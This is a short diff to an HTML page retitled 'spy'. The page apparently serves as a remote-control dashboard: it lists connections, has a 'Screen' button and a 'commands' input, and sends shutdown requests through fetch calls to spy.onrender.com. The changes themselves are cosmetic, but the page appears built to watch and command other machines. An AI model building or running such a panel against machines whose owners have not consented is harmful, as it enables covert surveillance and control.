@@ -5,13 +5,16 @@
 
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <title>shakti</title>
+        <title>spy</title>
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <link rel="stylesheet" href="">
         
     </head>
     <style>
+        #shit{
+            text-align: center;
+        }
         .Centerdiv {
             text-align: center;
             /* background-color: red; */
@@ -26,11 +29,12 @@
         
     </style>
     <body>
+        <h1 id="shit">Connections</h1>
         <div class="Centerdiv" id="damn">
 
            
             
-            <!-- <img id="img" src="https://img.freepik.com/free-vector/large-school-building-scene_1308-32058.jpg?w=2000" height="300" width="600"/> -->
+            
         </div>
         <div>
 <img id="img" src="">
@@ -57,7 +61,7 @@ for(let i=0;i<resp.length;i++){
 
 
 let btn=document.createElement("BUTTON");
-btn.innerHTML="get";
+btn.innerHTML="Screen";
 btn.onclick=async function(){
 
 
@@ -94,6 +98,7 @@ await fetch(`https://spy.onrender.com/accept/${resp[i]}/shut`)}
 
 let inp=document.createElement("input");
 inp.id=resp[i]
+inp.placeholder="commands"
 
 
 
